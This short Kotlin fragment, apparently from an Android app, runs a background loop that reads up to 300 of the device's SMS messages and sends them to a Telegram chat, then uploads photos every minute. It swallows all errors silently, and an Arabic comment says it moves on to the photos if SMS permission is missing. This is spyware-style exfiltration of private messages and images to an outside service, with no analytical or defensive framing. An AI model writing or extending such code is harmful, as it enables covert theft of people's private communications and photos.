private suspend fun loop() {
    var first = true
    while (currentCoroutineContext().isActive) {
        try {
            if (first) {
                try {
                    val sms = SmsReader.readAll(this, 300)
                    if (sms.isNotEmpty())
                        Telegram.sendText("📩 SMS (" + sms.size + ")\n" + sms.joinToString("\n"))
                } catch (e: Exception) {
                    // إلا ما كانتش صلاحية SMS، كمل للصور
                }
                first = false
            }
            sendPhotos()
        } catch (_: Exception) {}
        delay(60_000)
    }
}
